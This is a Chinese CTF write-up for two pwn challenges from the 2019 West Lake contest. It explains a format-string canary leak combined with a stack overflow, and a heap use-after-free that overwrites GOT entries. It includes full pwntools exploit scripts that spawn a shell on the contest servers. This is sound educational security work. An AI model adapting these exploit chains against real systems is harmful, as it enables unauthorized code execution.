---
title: 西湖论剑pwn部分writeup
date: 2019-04-07 18:51:01
tags:
---

这次一共有3道pwn题，出了2道，1道是简单格式化字符串+栈溢出，1道是简单堆UAF，还有一道以为是unlink结果开了PIE不知道怎么下手。

题目源文件：[link](https://github.com/CP32/ctf-pwn/tree/master/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019)，文件夹中的可能打了patch，压缩包中的是原题。

<!--more-->

# Story:

IDA分析，sub_400915函数中有个格式化字符串漏洞，sub4009A0函数中有个栈溢出漏洞。

checksec分析：

```
[*] '/home/ljb/ctf/xihu2019/story'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

发现有canary，没有开PIE，那么就可以利用格式化字符串漏洞去leak canary（通过这次题发现了每个函数的canary都是一样的），同时leak出read函数地址，再利用栈溢出调用system("/bin/sh")即可get shell。

##### exp:

```python
from pwn import *
io=remote("ctf1.linkedbyx.com",10465)
#io=process("./story")
elf=ELF("story")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_read=libc.symbols['read']
puts_plt=elf.plt['puts']
read_got=elf.got['read']
pop_rdi=0x400bd3

io.recvuntil("ID:")
io.sendline("%15$paaaaaa%10$s"+p64(read_got))
io.recvuntil("Hello ")
message=io.recvuntil("\n")
canary=message[:18]
print canary
canary=int(canary,16)
read_addr=u64(message[24:30]+'\x00\x00')
print hex(read_addr)

libcbase=read_addr-libc_read
system_addr=libcbase+libc.symbols['system']
binsh_addr=libcbase+libc.search("/bin/sh").next()

io.recvuntil("story:\n")
io.sendline("200")
io.recvuntil("story:\n")
payload='a'*0x88
payload+=p64(canary)
payload+='a'*8
payload+=p64(pop_rdi)
payload+=p64(binsh_addr)
payload+=p64(system_addr)
io.sendline(payload)
io.interactive()

```

![cat flag](https://github.com/CP32/ctf-pwn/blob/master/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190407191455.png?raw=true)



------



# **noinfoleak:**

checksec分析：

```
[*] '/home/ljb/ctf/xihu2019/noinfoleak'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

IDA分析，程序分为3部分功能，1：create，2：delete，3：edit。其中在delete部分存在一个UAF漏洞，只释放了堆空间但没有把存储指针的地方清零。所有堆的地址存储在bss段，下面称呼为info数组。

`free(info[2 * v0]);                         // UAF`

因为防护为Partial RELRO，而且没开PIE，因此考虑修改GOT表来get shell。又因为UAF漏洞，所以应该是利用改fd，达成任意地址写。一开始思路错了，想直接把堆迁移到GOT表上，结果发现对size的验证导致出错。后来想了想换成把堆迁移到bss段上。

##### 思路：

首先，申请几个堆，这里应该是要至少3个，比赛时没考虑直接申请了5个，不影响。然后再申请一个大小为0x18（大于0X18也可以）的堆A。之后delete(A)，利用UAF，把A的fd改成info首地址。然后重新把A申请回来，这时A原来所在的fastbin的fd指针会指向info首地址。再申请一个0x18大小的地址，就会把info开始的一块空间当作堆B分配出去。（这里要注意堆B的size要设好，就是info[1]，这里应设为0x31，否则会报错）

接下来对堆B的内容修改，相当于对info进行修改，所以我们把info[2]改为free_got，info[4]改为read_got，接下来调用edit函数，修改index为1的堆，这个堆的地址存在info[2]，则可以达成把free_got改为puts_plt，然后调用delete(2)，达成puts(read_got)，即可泄露read的地址，计算出libc偏移。

之后就简单了，故技重施，把free_got改为system，info[4]中放"/bin/sh"的地址，再调用delete(2)，达成system("/bin/sh")，get shell成功！

##### exp:

```python
from pwn import *
#io=process("./noinfoleak")
io=remote("ctf3.linkedbyx.com",11106)
elf=ELF("noinfoleak")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size,content):
	io.recvuntil(">")
	io.send("1")
	io.recvuntil(">")
	io.sendline(str(size))
	io.recvuntil(">")
	io.send(content)

def delete(index):
	io.recvuntil(">")
	io.sendline("2")
	io.recvuntil(">")
	io.sendline(str(index))

def edit(index,content):
	io.recvuntil(">")
	io.sendline("3")
	io.recvuntil(">")
	io.sendline(str(index))
	io.recvuntil(">")
	io.send(content)

free_got=elf.got['free']
read_got=elf.got['read']
puts_plt=elf.plt['puts']
bss=0x6010a0

#gdb.attach(io)
create(49,'A'*49)#0
create(8,'A'*8)#1
create(8,'A'*8)#2
create(8,'A'*8)#3
create(8,'A'*8)#4
create(0x18,'A'*0x18)#5

#delete(4)
delete(5)

edit(5,p64(bss))
create(0x18,'a'*0x18)#6=old 5
create(0x18,p64(free_got)+p64(49)+p64(read_got))#7,info[2]=free_got
edit(1,p64(puts_plt))#free->puts
delete(2)#puts(read_got)
read_addr=u64(io.recvuntil("\n")[:-1]+'\x00\x00')
print hex(read_addr)

libcbase=read_addr-libc.symbols['read']
system_addr=libcbase+libc.symbols['system']
binsh_addr=libcbase+libc.search("/bin/sh").next()

edit(7,p64(free_got)+p64(49)+p64(binsh_addr))#info[2]=free_got,info[4]=&"/bin/sh"
edit(1,p64(system_addr))#free->system
delete(2)#system("/bin/sh")
io.interactive()
```

![cat flag](https://raw.githubusercontent.com/CP32/ctf-pwn/master/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190407194055.png)



##### 西湖2019后记：

终于不用背锅了，算是第一次在有点名气的正式比赛中做出pwn题，而且做出了还在学的堆。但是这次比赛题还是太简单了，还有很长的路要走，继续加油吧！